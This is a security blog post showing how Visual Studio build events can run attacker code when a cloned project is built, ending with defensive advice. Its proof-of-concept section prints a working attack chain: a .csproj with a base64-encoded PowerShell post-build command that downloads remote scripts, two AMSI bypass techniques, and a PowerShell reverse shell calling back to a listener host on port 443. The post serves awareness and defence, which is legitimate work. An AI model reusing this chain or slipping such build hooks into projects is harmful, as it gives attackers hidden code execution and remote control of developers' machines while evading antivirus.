---
title: Security Risks For Building Projects In Visual Studio
description: Build events in Visual Studio can be dangerous
author: remco
date: 2023-10-22 11:33:00 +0800
categories: [Research, Windows]
tags: [research, Windows, Security]
pin: false
math: true
mermaid: true
image:
  path: /assets/img/posts/risks-vsstudio/vs-build-risks.png
---

It is very easy to clone a GitHub repository to Visual Studio, build it and use it. Who even cares about the source code right? Well, you should. After reading this blog you may want to reconsider building the program without checking it first.

## How does Visual Studio build a program?

To get a better understanding about the dangers of building a program in Visual Studio, we need to first understand how Visual Studio (VS) actually builds your program. 

Visual Studio uses a process called the MSBuild system to build projects. When you initiate a build within Visual Studio, here's a basic breakdown of what happens:

1. **Solution File:** Visual Studio organizes projects within a solution. When you build the solution, VS uses the solution file (.sln) to understand the projects it needs to build.
2. **Project Files:** Each project within the solution has its own project file (.csproj for C# projects, .vcxproj for C++ projects, etc.). These files contain configurations, references, compiler options, and more.
3. **MSBuild:** Visual Studio leverages MSBuild, which is a build platform used for compiling applications. MSBuild reads the project files, resolves dependencies, and orchestrates the build process.
4. **Tasks:** MSBuild executes a series of tasks to build the project. These tasks include tasks for compilation, resolving references, running preprocessors, etc. Tasks can be customized or extended using MSBuild targets.
5. **Output:** Once the build process completes, it generates the output files (executables, libraries, etc.) according to the configurations specified in the project files.

![](/assets/img/posts/risks-vsstudio/1.png)

More about Understanding the Build Process: ****[https://learn.microsoft.com/en-us/aspnet/web-forms/overview/deployment/web-deployment-in-the-enterprise/understanding-the-build-process](https://learn.microsoft.com/en-us/aspnet/web-forms/overview/deployment/web-deployment-in-the-enterprise/understanding-the-build-process)

## **PropertyGroup element**

In MSBuild, the `PropertyGroup` element is a fundamental building block within a project file (.csproj, .vcxproj, etc.) that defines a collection of properties. These properties can include various settings, configurations, or values used during the build process. 

[https://learn.microsoft.com/en-us/visualstudio/msbuild/propertygroup-element-msbuild?view=vs-2022](https://learn.microsoft.com/en-us/visualstudio/msbuild/propertygroup-element-msbuild?view=vs-2022)

## Build events

A build event is a command that MSBuild performs at a particular stage in the build process. These events allow developers to incorporate additional tasks or actions before or after the actual compilation and building of the project.

There are primarily four types of build events in MSBuild:

1. **Pre-build event:** Executed before the build process begins. Developers can use this event to perform actions like copying files, generating code, setting up environment variables, etc., necessary for the build.
2. **Post-build event:** Occurs after the build process completes. Actions such as copying the compiled output to specific directories, running tests, creating installers, or performing cleanup tasks are commonly performed during post-build events.
3. **Pre-link event (C++ projects):** Specific to C++ projects, this event occurs before the linker is invoked. Developers can perform custom actions before the linking phase, like modifying object files, updating resources, etc.
4. **Post-compile event (C++ projects):** Similar to the post-build event but specific to C++ projects, this event happens after compilation but before linking. Actions performed here might include additional processing on compiled files before the linking phase.

**Example:**

![](/assets/img/posts/risks-vsstudio/2.png)

Some of you will already see how this could potentially be harmful. If the build events execute commands or scripts that are not properly validated or sanitized, it could introduce security vulnerabilities. For instance, if the build event triggers scripts that download and execute external code from malicious sources, it can pose a significant security risk.

## Proof of Concept : Getting a reverse shell

<aside>
⛔ **Disclaimer:** Only use responsibly and legally. I do not assume any liability for any damages, losses, or adverse consequences resulting from the use or misuse of the PoC or information provided herein.

</aside>

For this PoC, I used a Windows 10 version 22H2 machine with Windows Defender + Firewall turned **ON**. I used a private GitHub repository to host my malicious repository that I can clone to VS. The VS version is “ Microsoft Visual Studio Community 2022 (64-bit) - Current Version 17.8.0”.

**csproj file**

```xml
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
    <PostBuildEvent>powershell.exe -e SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxAC4AMQAzADAALwBhAG0AcwBpAF8AYgB5AHAAYQBzAHMALgBwAHMAMQAnACkAKQA=</PostBuildEvent>
  </PropertyGroup>
</Project>
```

The csproj file includes a base64 encoded PowerShell script that gets executed using powershell.exe. The base64 payload was generated using:

```powershell
$payload = "IEX ((New-Object Net.WebClient).DownloadString('http://10.10.1.130/amsi_bypass.ps1'))"
[convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes("$payload"))
```

The payload actually uses a Invoke-Expression to invoke another PowerShell script that is hosted on a remote server. This script uses a AMSI bypass technique to bypass AMSI for the current process.

**amsi_bypass.ps1**

```powershell
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$me = $field.GetValue($field)
$me = $field.SetValue($null, [Boolean]"hhfff")

IEX((New-Object System.Net.WebClient).DownloadString('http://10.10.1.130/shell.ps1'))
```

As you can see, after bypassing AMSI for the current process, the script invokes yet another script. This is shell.ps1.

**shell.ps1**

```powershell
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)

$LHOST = "10.10.1.130"; $LPORT = 443; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

Shell.ps1 includes a technique to globally bypass AMSI. After doing so it will finally execute a reverse shell to the remote system listening on port 443 (HTTPS to also prevent firewall restrictions).

**Cloning the repository**

We copy the repository clone link to VS and click on “clone”:

![](/assets/img/posts/risks-vsstudio/3.png)

Using Kali, I will setup a webserver running on port 80 and listen on port 443 for incoming connects using netcat: 

![](/assets/img/posts/risks-vsstudio/4.png)

After setting everything up, we can build the project and see what happens.

![](/assets/img/posts/risks-vsstudio/5.png)

No errors in VS or Windows Defender pop-ups. Let’s take a look in Kali:

![](/assets/img/posts/risks-vsstudio/6.png)

Both scripts got downloaded successfully. Let’s take a look at our netcat listener:

![](/assets/img/posts/risks-vsstudio/7.png)

We successfully gained access to the system with Windows Defender + Firewall enabled on a up-to-date Windows 10 machine.

## Prevent building malicious programs

Build events are meant to be a VS functionality for developers. Disabling the build events is not a option since some programs require it build events to build the program properly. Although there are solutions to disable the events, it would be better to apply proactive measures and best practices:

- **Validate Inputs and Scripts:** Always validate inputs used in build events. Avoid directly incorporating user-provided or untrusted inputs in commands or scripts. Validate and sanitize inputs to prevent malicious code injection.
- **Restrict Permissions:** Limit the permissions granted to build events. Ensure that the build process has access only to the necessary resources and restrict unnecessary privileges.
- **Use Trusted Sources:** Avoid executing code or scripts from untrusted sources within build events. If external scripts or tools are necessary, ensure they come from reputable and trusted sources.
- **Education and Training:** Ensure that developers working on the project are aware of the risks associated with build events and are trained in secure coding practices. Promote a culture of security awareness within the development team.
- **Automated Builds in Secure Environments:** Consider setting up automated build processes in secure, isolated environments. These environments can have restricted access and controlled permissions, minimizing the impact of any potential malicious code.
